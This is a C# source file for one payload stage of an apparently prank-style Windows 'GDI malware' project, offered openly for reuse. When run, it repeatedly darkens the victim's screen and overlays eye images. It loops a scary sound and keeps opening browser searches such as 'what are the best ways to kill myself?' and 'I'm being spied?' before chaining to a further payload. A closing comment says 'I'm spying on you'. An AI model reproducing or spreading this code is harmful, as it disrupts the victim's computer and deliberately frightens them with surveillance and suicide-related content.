using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using NAudio.Wave;
using System.Windows.Forms;
using System.Diagnostics;
/* 
        This project was made by S-illy
           https://github.com/S-illy
      Also you can support me with a donation
           https://ko-fi.com/silly69
You can modify this source as you give me credits :D
 
*/
namespace winchancho
{
    public partial class Payload2 : Form
    {
        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, uint rop);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern void ReleaseDC(IntPtr hWnd, IntPtr hdc);

        private const uint SRCAND = 0x008800C6;
        private const uint SRCPAINT = 0x00EE0086;
        private const uint SRCCOPY = 0x00CC0020;
        private const uint SRCINVERT = 0x00660046;

        private Bitmap eyeImage;
        private WaveOutEvent waveOut;

        private string[] searchQueries = { "i think someone is staring at me", "I'm being spied?", "what are the best ways to kill myself?", "i'm scared, please help me", "i can see eyes on my screen watching me" };

        private System.Windows.Forms.Timer searchTimer;
        private System.Windows.Forms.Timer audioTimer;
        private System.Windows.Forms.Timer pay3;

        // Added to control the thread execution
        private CancellationTokenSource cancellationTokenSource;
        private CancellationToken token;

        public Payload2()
        {
            InitializeComponent();
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            waveOut = new WaveOutEvent();

            // Start the timer for the audio loop
            audioTimer = new System.Windows.Forms.Timer
            {
                Interval = 12000
            };
            audioTimer.Tick += new EventHandler(AudioTimer_Tick);
            audioTimer.Start();

            Noise(); // skary noise

            // dark gdi
            cancellationTokenSource = new CancellationTokenSource();
            token = cancellationTokenSource.Token;
            Thread meow = new Thread(new ThreadStart(SillyDark))
            {
                IsBackground = true
            };
            meow.Start();

            // Start the search timer
            searchTimer = new System.Windows.Forms.Timer
            {
                Interval = 8000
            };
            searchTimer.Tick += new EventHandler(SearchTimer_Tick);
            searchTimer.Start();
            pay3 = new System.Windows.Forms.Timer
            {
                Interval = 34000
            };
            pay3.Tick += new EventHandler(pay3_Tick);
            pay3.Start();

            eyeImage = Properties.Resources.eye;
        }

        private void SillyDark()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);

            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            Random rand = new Random();

            Graphics graphics = Graphics.FromHwnd(IntPtr.Zero);

            int counter = 0;
            int maxCycles = 1000; // Maximum number of iterations (change this number as needed!11)

            try
            {
                while (counter < maxCycles && !token.IsCancellationRequested) // Loop for a limited number of cycles
                {
                    // Dark GDI effect
                    BitBlt(hdc, rand.Next() % 2, rand.Next() % 2, w, h, hdc, rand.Next() % 2, rand.Next() % 2, SRCAND);

                    int imageX = rand.Next(0, x - 300);
                    int imageY = rand.Next(0, y - 300);

                    // Ensure the form is open before invoking the drawing
                    if (!this.IsDisposed)
                    {
                        Invoke((MethodInvoker)(() =>
                        {
                            try
                            {
                                // Drawing the image
                                graphics?.DrawImage(eyeImage, imageX, imageY, 300, 300);
                            }
                            catch (ObjectDisposedException)
                            {
                                // Ignore error if the form has been disposed
                                Console.WriteLine("Formulario o recursos desechados.");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"Error inesperado: {ex.Message}");
                            }
                        }));
                    }
                    Thread.Sleep(10);
                    counter++;  // i was trying to do sum
                }
            }
            finally
            {
                graphics.Dispose();
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        private void SearchTimer_Tick(object sender, EventArgs e)
        {
            // Select random search query
            Random rand = new Random();
            string query = searchQueries[rand.Next(searchQueries.Length)];
            // Open the search link
            Process.Start("https://www.google.com/search?q=" + Uri.EscapeDataString(query));
        }

        private void Noise()
        {
            var mp3Stream = new System.IO.MemoryStream(Properties.Resources.noise);
            var reader = new Mp3FileReader(mp3Stream);
            // Stop playing if already playing
            if (waveOut.PlaybackState == PlaybackState.Playing)
            {
                waveOut.Stop();
            }
            waveOut.Init(reader);
            waveOut.Play();
        }

        private void AudioTimer_Tick(object sender, EventArgs e)
        {
            Noise(); // Loop the noise
        }

        private void pay3_Tick(object sender, EventArgs e)
        {
            // Transition to Payload3 & Close this form
            pay3.Stop();
            waveOut.Stop();
            searchTimer.Stop();
            audioTimer.Stop();
            cancellationTokenSource.Cancel();
            PayloadCat payload3Form = new PayloadCat();
            payload3Form.Show();
        }
    }
}





/*
                               I'm spying on you...

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣷⣶⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⡿⢛⣿⣿⠿⠟⠋⠉⠁⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠿⠿⣶⣦⣄⣀⣴⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣾⠿⠋⠁⠀⠀⠀⠠⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠟⠁⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢦⡄⠀⠻⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⡀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢾⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⡀⠀⠀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣾⣿⣿⠿⢿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠃⠀⠀⠀⠀⣠⠂⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⡀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣧⠘⢿⣿⣿⣿⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⣿⣿⠇⠀⠀⠀⠀⢠⡟⠀⠀⢀⣴⣿⡇⠀⠀⠀⠀⠀⠀⣴⡄⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣇⠘⢿⣿⣿⣿⣿⣆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⡟⠀⠀⠀⠀⠀⣼⠃⠀⢠⣾⠋⠸⣿⠀⡄⠀⠀⠀⠀⣿⣿⣄⠀⠀⢠⡀⠀⠸⣷⡀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡄⢘⣿⣿⣿⣿⣿⠂⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣷⠄⠀⠀⠀⢰⣿⠀⣰⡿⠧⠤⣤⣿⡆⣷⠀⠀⠀⠀⣿⠉⢿⣦⠀⠘⣿⣦⡀⢻⣷⡀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣷⣿⣿⣿⣿⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⢸⣿⣰⡿⠁⠀⠀⠀⠘⣿⣿⣇⠀⠀⠀⣿⠀⠠⣿⣷⣶⣿⡿⢿⣾⣿⣧⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡂⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⡿⢿⣿⠀⠀⠀⠀⣸⣿⣿⣷⣿⣷⣦⣄⠀⣹⣿⣿⡄⠀⠀⣿⠀⠀⠀⠘⠿⣿⣧⠈⠻⣿⣿⡀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠏⠘⣿⣇⡀⠀⠀⠀
⠀⠀⠀⠀⢀⣿⠇⢸⡿⢾⡄⠀⠀⣿⣿⠋⢱⣿⣿⣿⣿⣷⡟⢻⣿⣷⡀⠀⣿⡀⢠⣤⢀⣠⣬⣿⣤⣄⡘⢿⡇⠀⠀⠀⢸⡀⠀⢿⣿⣿⣿⣇⠀⠀⢿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⠀⢸⡇⢸⡇⠀⠀⣿⣿⠀⣿⣿⣿⣿⣯⣉⣿⠀⠹⣿⣿⡄⢹⡇⢈⣴⣿⣿⣿⣿⣿⡿⣿⣿⣇⠀⠀⠀⢸⡇⠀⢸⣿⣿⣿⣿⠀⠀⢸⣿⡇⠀⠀⠀
⠀⠀⠀⠀⣿⡏⠀⣸⡇⣸⣿⡀⠀⣿⣷⠀⢻⣿⠛⠉⠻⣿⡇⠀⠀⠈⢿⣿⣼⣿⠘⣿⣿⣿⣿⣏⣹⡇⠘⣿⣿⠀⠀⠀⣾⡇⠀⢸⣇⣿⣿⣿⡀⠀⠈⣿⡇⠀⠀⠀
⠀⠀⠀⢀⣿⠇⠀⣿⣿⣿⣿⣇⠀⣿⡇⠀⠀⠙⠳⠶⠾⠋⠀⠀⠀⠀⠀⠙⠿⣿⣇⢻⣿⠛⠛⠻⣿⡇⠰⣿⡿⠀⠀⢠⣿⣿⣦⡀⣿⣿⣿⣿⠀⠀⠀⣿⣷⠀⠀⠀
⠀⠀⠀⣸⣿⠀⠀⣿⣿⣿⣿⣿⡄⢹⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠋⠀⠻⠷⠴⠾⠋⠀⠀⣸⡇⠀⠀⣾⣿⣿⡿⢿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢹⣿⠀
⠀⠀⠀⣿⡇⠀⠀⣿⣿⣿⡏⠹⣿⣾⣿⣿⣧⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠃⢀⣾⣿⣿⣿⠁⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⢸⣿⠁
⠀⠀⢀⣿⠃⠀⢸⣿⣿⣿⡇⠀⠘⢿⣿⣿⣿⣿⡻⢶⣤⣀⡀⠀⠐⠶⠤⠴⠆⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡏⣠⣿⣿⣿⡿⠃⠀⢻⣿⣿⡇⠀⠀⠀⠈⣿⡇⠀⠀⠀
⠀⠀⣸⣿⠀⢀⢸⣿⣿⣿⠀⠀⠀⠈⠻⠟⠻⣿⣿⣿⣿⣿⣿⣿⡷⢶⣶⣶⣦⣶⣶⣶⣶⣶⣿⠿⢟⣿⣿⣾⠟⠉⠉⠉⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⣿⣇⠀⠀⠀
⠀⠀⣿⡇⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⢿⣿⣟⡹⣷⣴⡿⣿⣅⣰⣿⠋⠙⣿⣄⠀⠸⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⢿⣿⠀⠀
⠀⢸⣿⠀⠀⣾⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⠃⠈⢹⣷⣾⠋⠉⢷⡄⢶⣾⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⢸⣿⠀⠀
⠀⣾⡏⠀⠀⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⢠⠀⣼⢧⣿⠉⢉⠹⣿⣾⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠸⣿⡄⠀
⢠⣿⠇⠀⠀⢻⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⢸⢀⣿⠀⣿⠀⠀⠀⠈⢿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⣿⡇⠀
⢸⡿⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣫⡿⡆⢸⣿⡆⣿⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⠀⠀⠀⠀⣿⣷⠀
⢸⣧⠀⠀⠀⠈⣿⣿⣿⣧⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣻⡟⡹⠁⣼⡟⠃⣿⡀⢸⡄⠀⠘⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⢹⣿⡄
⢸⣏⠀⠀⠀⠀⢹⣿⣿⣿⠀⠀⠀⢸⣇⣈⣿⣿⣿⣿⣟⡘⠁⠀⣹⣷⣶⣟⠁⠀⢳⣀⣀⣘⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠃⠀⠀⠀⠀⠘⣿⡇
⢸⣿⠀⠀⠀⠀⠈⣿⣿⣿⠀⠀⠀⠀⠛⠛⠛⢉⣼⣿⣿⣿⣧⣴⣿⣿⣿⣿⣆⢠⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠠⠀⠀⠀⣿⣧
⠘⣏⠀⠀⠀⠀⠀⠸⣿⣿⡆⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣾⡟⠀⠀⠀⠀⠀⠀⠀⣿⣿⠇⠀⠀⠐⠀⠀⠀⣿⣧
⠀⢻⣧⠀⠀⠀⠀⠀⢻⣿⣷⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣟⣻⣿⣿⣿⣿⣿⣿⣟⣻⣿⣿⣷⡿⠟⠁⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠀⠀⠀⢰⠀⠀⠀⣿⣿
⠀⠀⠹⣷⣀⠀⠀⠀⠀⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⣯⣭⣿⣿⣿⣿⢻⣛⣉⣉⣁⣰⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⠁⠀⠀⢰⡎⠀⠀⣼⣿⡝
⠀⠀⠀⠘⢿⣿⣦⡀⠀⠘⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠃⠀⢠⣶⠋⠀⢀⣼⣿⠋⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣶⣦⣽⣿⣦⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⢃⣴⣿⠋⠀⢀⣴⣿⡿⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠛⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣀⣠⣶⣿⠟⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⠿⠿⠟⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠿⠟⠛⠁⠀⢿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/